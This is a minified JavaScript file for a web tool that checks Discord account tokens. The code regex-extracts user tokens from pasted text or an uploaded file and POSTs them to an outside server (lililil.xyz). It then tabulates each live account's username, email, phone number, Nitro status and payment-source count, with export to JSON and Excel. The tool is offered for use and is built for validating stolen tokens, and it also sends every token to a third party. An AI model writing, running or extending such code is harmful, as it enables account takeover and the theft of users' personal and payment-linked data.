function readFile(){let e=document.getElementById("file").files[0];if(e){let t=new FileReader;t.readAsText(e,"UTF-8"),t.onload=function(e){checkTokens(e.target.result)}}}function checkTokens(e=document.getElementById("tokens").value){let t=[...new Set([...JSON.stringify(e).matchAll(/(mfa\.[\w_\-]{84})|([\w]{24}\.[\w_\-]{6}\.[\w_\-]{27})/g)].map(e=>e.slice(1)).flat(1/0).filter(Boolean))];if(0===t.length||t.length>1e3)return alert("Too many tokens or they not found. Limit of amount tokens: 1000");let n=new XMLHttpRequest;n.open("POST","https://lililil.xyz/checker",!0),n.setRequestHeader("Content-type","application/json"),n.responseType="json",n.onload=function(){if(document.getElementById("input_tokens").classList.replace("input_tokens","hide"),document.getElementById("results").classList.replace("hide","results"),200!==n.status)return document.getElementById("input_tokens").classList.replace("hide","input_tokens"),document.getElementById("results").classList.replace("results","hide"),alert(n.response.message);for(let e of Object.keys(n.response.tokensData))if("invalid"!==n.response.tokensData[e].status){let t,s,o;t=1===n.response.tokensData[e].me.purchased_flags?"Classic":2===n.response.tokensData[e].me.purchased_flags?"Boost":"",s=n.response.tokensData[e]["payment-sources"].length>0?n.response.tokensData[e]["payment-sources"].length:"",o=null!==n.response.tokensData[e].me.phone?n.response.tokensData[e].me.phone:"",document.getElementById("resultBody").innerHTML+=`<td>${n.response.tokensData[e].status}</td>\n                <td>${n.response.tokensData[e].me.username}#${n.response.tokensData[e].me.discriminator}</td>\n                <td>${n.response.tokensData[e].me.locale}</td>\n                <td>${n.response.tokensData[e].me.email}</td>\n                <td>${o}</td>\n                <td>${t}</td>\n                <td>${s}</td>\n                <td>${n.response.tokensData[e].me.id}</td>\n                <td>${e}</td>`}else document.getElementById("resultBody").innerHTML+=`<td>${n.response.tokensData[e].status}</td>\n                <td></td>\n                <td></td>\n                <td></td>\n                <td></td>\n                <td></td>\n                <td></td>\n                <td></td>\n                <td>${e}</td>`;let e=document.getElementById("resultBody").rows,t=0;for(;"valid"!==e[0].getElementsByTagName("TD")[0]&&(sortTable(0),2!==t);)t+=1;sessionStorage.setItem("tokensOutput",JSON.stringify(n.response))},n.send(JSON.stringify(t))}function downloadOutput(){let e=JSON.parse(sessionStorage.getItem("tokensOutput"));for(let t of Object.keys(e.tokensInfo))0!==e.tokensInfo[t].length&&download(t,e.tokensInfo[t].join("\n"));download("json_output.json",JSON.stringify(e,null,"\t"))}function download(e,t){let n=document.createElement("a");n.setAttribute("href","data:text/plaincharset=utf-8,"+encodeURIComponent(t)),n.setAttribute("download",e),n.click()}function exportTableToExcel(e="table",t="Tokens Data",n="tokens_data.xls"){e.nodeType||(e=document.getElementById(e));let s={worksheet:t||"Worksheet",table:e.innerHTML},o=document.createElement("a");var a;o.download=n,o.href="data:application/vnd.ms-excel;base64,"+function(e){return window.btoa(unescape(encodeURIComponent(e)))}((a=s,'<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><title></title><head>\x3c!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--\x3e<meta http-equiv="content-type" content="text/plain charset=UTF-8"/></head><body><table>{table}</table></body></html>'.replace(/{(\w+)}/g,function(e,t){return a[t]}))),o.click()}function sortTable(e){let t,n,s,o,a,l,r,d,i=0;for(t=document.getElementById("resultBody"),s=!0,d="asc";s;){for(s=!1,n=t.rows,o=0;o<n.length-1;o++)if(r=!1,a=n[o].getElementsByTagName("TD")[e],l=n[o+1].getElementsByTagName("TD")[e],"asc"===d){if(a.innerHTML.toLowerCase()>l.innerHTML.toLowerCase()){r=!0;break}}else if("desc"===d&&a.innerHTML.toLowerCase()<l.innerHTML.toLowerCase()){r=!0;break}r?(n[o].parentNode.insertBefore(n[o+1],n[o]),s=!0,i++):0===i&&"asc"===d&&(d="desc",s=!0)}}